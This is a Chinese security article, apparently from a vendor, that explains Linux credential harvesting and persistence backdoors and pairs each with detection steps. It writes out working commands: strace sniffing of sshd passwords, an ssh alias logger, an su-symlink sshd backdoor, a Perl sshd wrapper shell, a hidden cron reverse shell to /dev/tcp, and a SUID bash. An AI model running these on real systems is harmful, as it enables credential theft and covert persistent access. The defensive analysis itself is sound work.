## **一、** **引言**

当 **RedTeam**
拿下了一台服务器并获取到系统较高权限，但不知道服务器的凭证时，RedTeam会采用怎样的技术获取系统凭证呢？又或者，在RedTeam拿下一台服务器，为达到长久控制的目的而专门定制持久化后门（免杀肯定是必须的）的前提下，他们会如何结合系统自身的某些特性，达到持久化控制的效果？
**BlueTeam**
在应急响应的过程中，又该如何尽早地排查出这些后门？为尽到“知己知彼，百战不殆”，本文将对Linux下常见的权限维持技术和凭据收集技术进行解析，希望能对从事
**攻防对抗研究** 的小伙伴有所帮助。

###

##  **二、** **Strace获取登陆凭证**

###

 **1、** **strace获取登陆凭证原理**

凭证将会通过 **strace** 追踪到系统sshd进程，并将追踪到的信息保存到log文件，这些信息中包含了系统明文密码以及ssh私钥。

 **2、** **strace获取登陆凭证实现**

 **strace获取登陆凭证利用** **条件** **包括：**

  * 内核版本>Linux Kernel 3.4支持完全限制或禁用ptrace的功能。

  * 具有kernel.yama.ptrace_scope限制和禁用。

 **具体实现**

获取sshd进程明文密码。可使用括号执行程序，然后退出当前shell，并用ssh登录其他主机。

(strace-f-F-p`ps aux|grep"sshd-D"|grep-v grep|awk{'print$2'}`-t-e
trace=read,write-s 4096 2>/tmp/.sshd.log&)  
  
---  
  
![g54JEjCf_XVPG.png](https://image.3001.net/images/20221109/1667973237_636b4075318c9d00e867b.png!small)图1

strace捕获到的凭证将会保存在/tmp/.sshd.log文件下：

![nO7rvySB_4SDf.png](https://image.3001.net/images/20221109/1667973237_636b4075d2fc68568bed0.png!small)图2

 **3、** **Strace获取登陆凭证检测响应**

1）使用ps工具查看系统中的strace进程。

![DwSq49dO_4tX7.png](https://image.3001.net/images/20221109/1667973238_636b4076b41f9d2e95c99.png!small)图3

2）使用kill工具阻断进程运行。

![JuZLFyzf_rKHM.png](https://image.3001.net/images/20221109/1667973239_636b407760b5ae13a2968.png!small)图4

##  **三、** **Alias获取登陆凭证**

 **1、** **Alias获取登陆凭证原理**

给指定程序设置命令别名，使运行指定程序时自动strace读写系统调用，收集登录凭证。

 **2、** **Alias获取登陆凭证实现**

1）在终端中执行。

#添加命令别名

vi~/.bashrc或者/etc/bashrc

alias ssh='strace-o/tmp/.sshpwd-`date'+%d%h%m%s'`.log-e
read,write,connect-s2048 ssh'

#使命令别名立即生效

source~/.bashrc  
  
---  
  
![X4fPIXPe_7CLs.png](https://image.3001.net/images/20221109/1667973239_636b4077e7248192e40cd.png!small)图5

2）通过查看日志文件，能看到有系统凭证的信息。

![7ObReQQq_hDWq.png](https://image.3001.net/images/20221109/1667973240_636b407894ff9fab61267.png!small)图6

 **3、** **Alias获取登陆凭证检测响应**

1）使用alias工具即可发现异常

![XDKup6de_d5KO.png](https://image.3001.net/images/20221109/1667973241_636b4079453d3ad986684.png!small)图7

2）打开.bashrc文件，查看并清除后门命令。

![qhAjNYtj_SeXC.png](https://image.3001.net/images/20221109/1667973241_636b4079c0ae0e50d94ea.png!small)图8

##  **四、** **SSH软连接后门**

 **1、** **SSH软连接后门原理**

软连接后门的原理是利用了PAM配置文件的作用，将sshd文件软连接名称设置为su，这样应用在启动过程中会去PAM配置文件夹中寻找是否存在对应名称的配置信息（su），su在pam_rootok只检测uid
0即认证成功，导致了可以使用任意密码登录。

 **2、** **SSH软连接后门实现**

1）在靶机上安装ssh后门，执行。

ln-sf/usr/sbin/sshd/usr/local/su;/usr/local/su-oPort=12345  
  
---  
  
2）攻击机中用ssh终端连接工具，密码随意填写即可实现任意密码登录。

![8KZ7GJIG_I937.png](https://image.3001.net/images/20221109/1667973242_636b407a5f33bc240d763.png!small)图9

笔者在测试环境下还发现有”chsh”、”chfn”等shell程序包含pam_rootok.so，均能够用于SSH软连接后门的植入。

![gZHmSDrd_SaT6.png](https://image.3001.net/images/20221109/1667973243_636b407b3433313ec3ee7.png!small)图10

 **3、** **SSH软连接后门检测响应**

1）查看系统当前端口状态。

这类后门会开启监听端口，我们可以先查看/etc/pam.d/目录下有哪些文件包含该配置，然后通过管道符找到异常端口及进程，再通过进程找到异常文件、杀掉进程、关闭PAM认证即可。

find/etc/pam.d/|xargs grep"pam_rootok.so"

netstat-antlp|grep-E"su|chsh|chfn|runuser"  
  
---  
  
![vwGvGNKn_ApUN.png](https://image.3001.net/images/20221109/1667973243_636b407bda448cf45d801.png!small)图11

2）查看系统登录日志

![JCJsvKmf_uPAj.png](https://image.3001.net/images/20221109/1667973244_636b407ca201296012c17.png!small)图12

##  **五、** **SSH公钥免密登陆后门**

 **1、** **公钥免密后门原理**

ssh无密码登录要使用公钥与私钥。linux下可以用ssh-keygen生成公钥/私钥，即利用密钥认证登录。

 **2、** **公钥免密登录后门实现**

1）在攻击机上生成公钥文件，“回车”默认配置。

ssh-keygen-t rsa  
  
---  
  
2）将攻击机上的id_rsa.pub文件拷贝至靶机。

1.ftp、scp等工具上传至靶机或者U盘植入；

2.将公钥文件放置vps服务器，然后靶机用wget/curl下载；

3.各类可用于远程传输的工具均可（如：nc）。  
  
---  
  
![mIaurNHT_qTXy.png](https://image.3001.net/images/20221109/1667973245_636b407d3f956de2a4a36.png!small)图13

3）攻击机ssh连接靶机，无需密码认证。

![NdzVURg5_CVWW.png](https://image.3001.net/images/20221109/1667973245_636b407dced82c0fe0ec1.png!small)图14

 **3、** **公钥免密登陆后门检测响应**

1）查看系统当前登录状态。

![bIJORB6p_qmrK.png](https://image.3001.net/images/20221109/1667973246_636b407e8d16086e7b2ed.png!small)图15

##  **六、** **SSH wrapper后门**

 **1、** **SSH wrapper后门原理**

Linux中init首先启动的是/usr/sbin/sshd，原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。如果这个子进程的标准输入输出已被重定向，那么getpeername能获取到客户端的TCP端口，将会派生给执行sh命令执行的权限。简而言之就是反弹shell，与常见的反弹shell不同的是，
**SSH wrapper后门通过长连接反弹shell的方式，使得攻击者在退出终端后仍然能进行连接** 。

 **2、** **SSH wrapper后门实现**

1）在靶机（服务端）中执行监听，终端中执行。

cd/usr/sbin/

mv sshd../bin/

echo'#!/usr/bin/perl'>sshd

echo'exec"/bin/sh"if(getpeername(STDIN)=~/^..4A/);'>>sshd

echo'exec{"/usr/bin/sshd"}"/usr/sbin/sshd",@ARGV,'>>sshd

chmod u+x sshd

/etc/init.d/sshd restart  
  
---  
  
2）在攻击机（客户端）中执行连接命令，获得一个命令执行权限的shell。

![p9aINICH_46T2.png](https://image.3001.net/images/20221109/1667973247_636b407f4689475d6134f.png!small)图16

 **3、** **SSH wrapper后门检测响应**

1）查看sshd文件修改状况。

ls-al/usr/sbin/sshd

cat/usr/sbin/sshd  
  
---  
  
![vD4XAxK7_THsz.png](https://image.3001.net/images/20221109/1667973248_636b4080141637a122a44.png!small)图17

2）清除SSH wrapper后门。

通过重装ssh服务清除SSH wrapper后门。

##  **七、** **Cron后门**

 **1、** **Cron后门原理**

###

crontab命令用于设置周期性被执行的指令，可以把cron设置为开机时自动启动。攻击者将恶意代码或程序隐藏在系统磁盘中，并由计划任务调用时启动它们。

 **2、** **Cron后门实现**

1）平平无奇的Cron后门。

(crontab-l;echo'*/1****/bin/bash/tmp/1.sh;/bin/bash--noprofile-i')|crontab-  
  
---  
  
能用crontab-l命令查看到具体内容。

![jvUvc95z_wu6n.png](https://image.3001.net/images/20221109/1667973248_636b4080a2fea9980b113.png!small)图18

2）隐蔽的Cron后门。

(crontab-l;printf"*/1****bash-i>&/dev/tcp/ip/port 0>&amp1/bin/bash--noprofile-i;\rno crontab for`whoami`%100c\n")|crontab-  
  
---  
  
用crontab-l命令则无法查看到具体内容。

![bMS6OTn7_fhHM.png](https://image.3001.net/images/20221109/1667973249_636b40814b7a24661a994.png!small)图19

这是因为利用到了cat工具的特性。cat默认支持一些如\r回车符、\n换行符、\f换页符等，也就是这些符号导致的能够隐藏命令。

3）攻击机获得shell连接。

![TjwNkTrR_weU3.png](https://image.3001.net/images/20221109/1667973250_636b408201b09fa6455e1.png!small)图20

 **3、** **Cron后门检测响应**

1）查看可疑的计划任务。

crontab-e  
  
---  
  
2）使用vim命令在cron创建的文件下查找并清除恶意代码。

![Q2S37QW9_rHUn.png](https://image.3001.net/images/20221109/1667973250_636b40828d58890bb313c.png!small)图21

##  **八、** **SUID Shell后门**

 **1、** **SUID Shell后门原理**

Suid shell是一种可用于以拥有者权限运行的shell。攻击者将原有的bash进程copy并隐藏，给予可执行的权限，达到隐藏后门的目的。

 **2、** **SUID Shell后门实现**

1）在终端中执行如下命令。

#cp/bin/bash/tmp/shell

#chmod u+s/tmp/shell

用普通权限用户执行shell程序。

$/tmp/shell-p  
  
---  
  
![Vw9LfSb8_Rf7u.png](https://image.3001.net/images/20221109/1667973251_636b408314a7fc9114364.png!small)图22

 **3、** **SUID Shell后门检测响应**

1）在Linux中查找SUID设置的文件。

![WqQKhB8r_zdCZ.png](https://image.3001.net/images/20221109/1667973251_636b4083a6d63495ef70f.png!small)

图23

2）取消shell程序的s权限。

chmod u-s/tmp/shell  
  
---  
  
##  **九、** **Tcp wrapper后门**

###

###

 **1、** **Tcp wrapper后门原理**

TCP_Wrappers(一个工作在应用层的安全工具)，通过修改配置文件hosts.allow，实现tcpd（Tcp
Wrapper的守护进程）的截获请求。每当有ssh的连接请求时，如若请求满足配置文件中的规则，则放行，否则中断连接，配置文件中可配置执行命令。

 **2、** **Tcp wrapper后门实现**

1）编辑配置文件，并写入恶意代码。

![KeQY5GuV_uxKv.png](https://image.3001.net/images/20221109/1667973252_636b40842ff59e786c473.png!small)图24

2）在攻击机上开启本地端口监听。

![VMU4SmX3_9YTB.png](https://image.3001.net/images/20221109/1667973252_636b4084b9c96c701d776.png!small)图25

3）连接目标服务器的22端口，触发后门，无需输入密码，监听端口将会获得shell连接。

![Tzc7PvCj_fzmp.png](https://image.3001.net/images/20221109/1667973253_636b40854c0492f6013b5.png!small)图26

 **3、** **Tcp wrapper后门检测响应**

1）在/etc/hosts.allow文件中查找并删除恶意代码。

![](https://image.3001.net/images/20221109/1667973253_636b4085ddc99a4343612.png!small)

图27

##  **十、** **Systemd服务后门**

 **1、** **Systemd服务后门原理**

Linux下的服务启动后门，可创建或配置系统服务文件中的ExecStart参数，实现启动服务时，调用恶意代码的执行。

 **2、** **Systemd服务后门实现**

1）创建服务描述文件。

![TPjz5pJ8_P7Aa.png](https://image.3001.net/images/20221109/1667973254_636b4086788f8e23beaee.png!small)图28

2）编辑backdoor.service文件，加入下面的内容。

![nHc7XkWd_NJcy.png](https://image.3001.net/images/20221109/1667973255_636b40870a59fce6f13f9.png!small)图29

3）给予执行权限，并重新读取服务信息，使得服务生效。

![FhqR475M_ccyh.png](https://image.3001.net/images/20221109/1667973255_636b408790a0db1cc104f.png!small)图30

![5g92vWZw_hKKO.png](https://image.3001.net/images/20221109/1667973256_636b4088271837f263a5c.png!small)图31

4）在启动服务后，攻击机监听的端口将会返回一个shell。

![AaYwPzXI_PRbG.png](https://image.3001.net/images/20221109/1667973256_636b4088bc9a899eaa1da.png!small)图32

 **3、** **Systemd服务后门检测响应**

1）在/usr/lib/systemd/system下的服务文件中查找并删除恶意代码。

![WdGWW5v9_aTU5.png](https://image.3001.net/images/20221109/1667973257_636b408956cc7d7224e94.png!small)图33

##  **十一、** **Vim python2拓展后门**

###

 **1、** **Vim python2扩展后门原理**

###

vim安装时默认安装了当前服务器的python版本的扩展，利用该扩展，可以用vim的扩展pyfile来执行python脚本。

 **2、** **Vim python2扩展后门实现**

1）在靶机上创建python反弹shell脚本attck.py。

![Zz3QyRbk_mz4C.png](https://image.3001.net/images/20221109/1667973257_636b4089e1b7ed4885b72.png!small)图34

2）在攻击机中开启端口监听。

![ITpmLYdT_gQgK.png](https://image.3001.net/images/20221109/1667973258_636b408a77e339d52da4e.png!small)图35

3）靶机在执行vim-E-c"pyfile attck.py"命令后，攻击机监听的端口将会返回shell。

![rpwvNbXJ_ZMup.png](https://image.3001.net/images/20221109/1667973259_636b408b07c1dbaeefbcc.png!small)图36

 **3、** **Vim python2扩展后门检测响应**

1）查看当前系统是否有可疑的网络连接；

![](https://image.3001.net/images/20221109/1667973259_636b408ba08897a549d54.png!small)

图37

2）定位到vim进程，查看执行的命令调用了python扩展；

![IYwXNK6G_qta8.png](https://image.3001.net/images/20221109/1667973260_636b408c2ede4aa483dce.png!small)图38

3）定位到可疑脚本路径，查找并清除可疑后门脚本；

![nEfBRvcz_uSMX.png](https://image.3001.net/images/20221109/1667973260_636b408cb4e96fec979ef.png!small)图39

##  **十二、** **安全狗的后门检测案例介绍**

Linux系统中后门驻留的方式花样繁杂，任何一个配置、一个语句、一行代码，都会给攻击者可乘之机。如今内网攻击手段越来越趋于隐蔽化，攻击者在进入内网系统环境后操作更加谨慎，为达到隐匿自己行踪的目的，攻击者会开启常用端口作为网络连接回传，从而误导防守者的研判与分析。

以下“Tcp
wrapper后门”为例，攻击者利用443端口回传数据。总所周知，443端口是https协议传输端口，而攻击者将其tcp回传用https障眼。而在进程行为中，并无可疑的命令执行。

![Gj7W3CEV_2hA2.png](https://image.3001.net/images/20221109/1667973261_636b408d4a9c28da9dc73.png!small)图40

多数防守者在发现端口是443就默认会放过，因为系统中成百上千条进程网络连接就够防守者头痛了。而少部分防守者在发现443端口协议应该是https而非tcp的端倪时，却很难继续往系统内部溯源发现是hosts.allow配置文件驻留有后门代码，顶多就用微步等网络测绘工具查看目的地址是否标记恶意或非恶意，若是非恶意则就不了了之，殊不知已然酿成大祸。

安全狗的云眼主机防御系统能实时对主机异常行为做研判分析。以上述的“Tcp
wrapper后门”为例，通过定时采集系统中能被作用于后门驻留的配置文件做规则匹配，快速定位到对应的配置文件及后门恶意代码内容，快速响应。

![D3jzcEau_cIOJ.png](https://image.3001.net/images/20221109/1667973261_636b408dd5fb85a03d1b5.png!small)图41

目前，云眼针对后门驻留的检测规则有数百条，除了文章中演示的linux常见后门以外，还支持对各类反弹shell后门脚本的检测。

![SGOSXAOx_RS3N.png](https://image.3001.net/images/20221109/1667973262_636b408eb0ffb146e3fc5.png!small)图42

![fspssjnt_5x2Z.png](https://image.3001.net/images/20221109/1667973263_636b408fcdced404ff662.png!small)图43

